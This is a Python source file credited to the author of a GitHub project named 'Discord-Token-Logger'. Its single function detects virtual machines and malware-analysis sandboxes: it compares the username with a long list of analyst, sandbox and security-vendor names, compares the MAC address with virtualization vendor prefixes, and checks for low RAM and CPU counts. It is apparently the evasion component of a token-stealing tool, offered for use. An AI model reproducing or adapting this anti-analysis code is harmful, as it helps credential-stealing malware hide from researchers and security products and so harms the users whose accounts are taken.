# Author - deadconvicess
# Github - https://github.com/deadconvicess/Discord-Token-Logger


# Simple VM Checker  
import os
import uuid
import psutil
def vmchecker():
    vm_usernames = {
        "wdagutilityaccount", "sandbox", "user", "test", "john-pc", "malware", "vm",
        "admin", "administrator", "testuser", "analyst", "debug", "maltest", "malbox",
        "lab", "research", "avtest", "testvm", "vmuser", "winvm", "vmadmin", "test1",
        "qauser", "qa", "qadev", "forensics", "detonation", "honeypot", "dummy",
        "security", "analysis", "virtual", "vbox", "vmware", "hyperv", "win7test",
        "win10test", "vmlab", "vmtest", "pcuser", "sample", "malanalyzer", "viruslab",
        "vmmonitor", "emulator", "emuluser", "cuckoo", "detector", "fakeuser", "decoy",
        "threatuser", "threatlab", "simulator", "vminstance", "cloudvm", "clouduser",
        "sysadmin", "system", "techuser", "winuser", "xpuser", "vulnuser", "tester",
        "workstation", "nocuser", "debugger", "reverse", "reveng", "vmnode", "winbox",
        "botuser", "botlab", "defender", "edrvm", "intelnoc", "virustest", "sandboxie",
        "demo", "corporate", "enterprise", "adminvm", "isolated", "inspection", "sysinspect",
        "hookuser", "traceuser", "audituser", "auditvm", "iso_user", "testbed", "samplebox",
        "testdomain", "vmdev", "developer", "vmpc", "blueuser", "vmblue", "vmanalyst",
        "tester1", "test_account", "remoteuser", "safeuser", "unknown", "unnamed", "analyzer",
        "protection", "protected", "analysisvm", "sandboxuser", "vmanalysis", "scanuser",
        "scantool", "sigscan", "artifact", "artifactuser", "controlled", "loggeduser",
        "avscanner", "avengine", "dyn_user", "guest", "evaluser", "evalbox", "evalvm",
        "cyberuser", "cyberlab", "cybervm", "root", "rootvm", "d3bug", "quarantine",
        "observed", "virmachine", "suspect", "containment", "fireeye", "crowdstrike",
        "mde", "sentinelone", "carbonblack", "vmcarbon", "infosec", "vmsec", "info_user",
        "networkadmin", "winlab", "labaccount", "avlab", "staticvm", "dynuser", "securevm",
        "vmhost", "hyperhost", "isouser", "vpro", "malcheck", "safebox", "vmlogger",
        "eventuser", "logger", "threatbox", "policyuser", "investigator", "autouser",
        "defaultuser", "pc-lab", "winlabvm", "win10sandbox", "sandboxvm", "detectionuser",
        "witness", "eval", "infosectest", "valvm", "dlab", "nodevm", "clouduse", "awsuser",
        "azureuser", "gcpvm", "vboxuser", "defaultuser0", "user001", "vmlocal", "corpvm",
        "forensic", "avengine", "avuser", "avbox", "malresearch", "scanvm", "monitor",
        "vmobserver", "surveyor", "surveil", "investig8", "dmzvm", "testenv", "tstuser",
        "securityeng", "analyzevm", "sysmon", "loguser", "huntvm", "hunter", "watcher",
        "sensor", "inteluser", "fwuser", "winsec", "secuser", "restricted", "robox", "detectionvm"
    }
    vm_mac_prefixes = {
        "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", "00:03:FF", "00:1C:42", "00:0F:4B", "00:16:3E",
        "00:15:5D", "00:21:F6", "08:00:27", "52:54:00", "00:14:4F", "00:25:90", "00:0D:3A", "00:1F:29",
        "00:18:51", "00:50:43", "00:0C:EC", "00:1B:21", "00:1B:24", "00:13:74", "00:25:AE", "00:05:9A",
        "00:16:76", "00:1A:4B", "00:1E:8C", "00:50:8B", "00:15:17", "00:22:48", "00:1B:78", "00:30:18",
        "00:0E:C6", "00:19:99", "00:1C:23", "00:0F:34", "00:1C:7B", "00:1D:9A", "00:50:DA", "00:50:FC",
        "00:1D:D8", "00:24:E8", "00:21:28", "00:13:02", "00:22:FA", "00:16:EC", "00:1B:63", "00:19:5B",
        "00:1F:C6", "00:0A:E4", "00:50:58", "00:1F:16", "00:1E:EC", "00:25:96", "00:24:81", "00:1F:90",
        "00:1A:A0", "00:50:BE", "00:50:C2", "00:1E:90", "00:21:CC", "00:50:AE", "00:30:5A", "00:17:FA",
        "00:1D:09", "00:50:F2", "00:1E:68"
    }
    username = os.getenv("USERNAME", "").lower()
    if username in vm_usernames:
        return True
    mac_num = uuid.getnode()
    mac_addr = ':'.join(f"{(mac_num >> ele) & 0xff:02X}" for ele in range(40, -8, -8))
    if any(mac_addr.startswith(prefix) for prefix in vm_mac_prefixes):
        return True
    if psutil.virtual_memory().total < 2 * 1024 ** 3:
        return True
    if psutil.cpu_count(logical=False) is not None and psutil.cpu_count(logical=False) < 2:
        return True

    return False

